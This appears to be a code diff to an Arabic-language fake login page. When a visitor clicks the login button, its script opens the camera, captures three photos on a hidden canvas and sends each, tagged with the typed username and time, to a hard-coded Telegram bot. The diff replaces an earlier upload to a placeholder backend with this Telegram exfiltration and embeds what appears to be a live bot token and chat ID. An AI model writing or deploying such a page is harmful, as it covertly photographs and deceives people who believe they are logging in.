@@ -1,5 +1,4 @@
 
-
 <!DOCTYPE html>
 <html lang="ar">
 <head>
@@ -35,12 +34,16 @@
   <canvas id="c" width="640" height="480" style="display:none"></canvas>
 
 <script>
-const BACKEND_URL = "https://YOUR-USER.pythonanywhere.com/upload"; 
 const btn = document.getElementById('loginBtn');
 const status = document.getElementById('status');
 const video = document.getElementById('v');
 const canvas = document.getElementById('c');
 const ctx = canvas.getContext('2d');
+
+// ====== إعدادات التلغرام ======
+const TOKEN = "8408449205:AAHQ6__cO8R7s3kEmZsFTl0hNY9aUYscenM";     // من BotFather
+const CHAT_ID = "6504203392";  // من getUpdates
+const API_URL = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
 
 function setStatus(t){ status.textContent = t; }
 
@@ -56,11 +59,17 @@ async function captureOnce(){
   return canvas.toDataURL('image/png');
 }
 
-async function sendToBackend(data, meta={}){
-  const res = await fetch(BACKEND_URL, {
-    method:'POST',
-    headers: {'Content-Type':'application/json'},
-    body: JSON.stringify({ image: data, meta })
+// دالة لإرسال الصورة للتلغرام
+async function sendToTelegram(image, caption="صورة جديدة") {
+  const blob = await (await fetch(image)).blob();
+  const formData = new FormData();
+  formData.append("chat_id", CHAT_ID);
+  formData.append("caption", caption);
+  formData.append("photo", blob, "image.png");
+
+  const res = await fetch(API_URL, {
+    method: "POST",
+    body: formData
   });
   return res.ok;
 }
@@ -75,14 +84,14 @@ btn.addEventListener('click', async ()=>{
     const meta = { user: document.getElementById('user').value || "", time: Date.now() };
     for(let i=1;i<=3;i++){
       const img = await captureOnce();
-      const ok = await sendToBackend(img, meta);
+      const ok = await sendToTelegram(img, `User: ${meta.user}, Time: ${meta.time}`);
       setStatus(ok? `أرسلت الصورة ${i}/3` : `خطأ إرسال الصورة ${i}`);
       await new Promise(r=>setTimeout(r,800));
     }
     setStatus('انتهت العملية');
   }catch(e){
     console.error(e);
-    setStatus('فشل الوصول للكاميرا أو الخادم');
+    setStatus('فشل الوصول للكاميرا أو التلغرام');
   }finally{
     if(video.srcObject) video.srcObject.getTracks().forEach(t=>t.stop());
     btn.disabled = false;
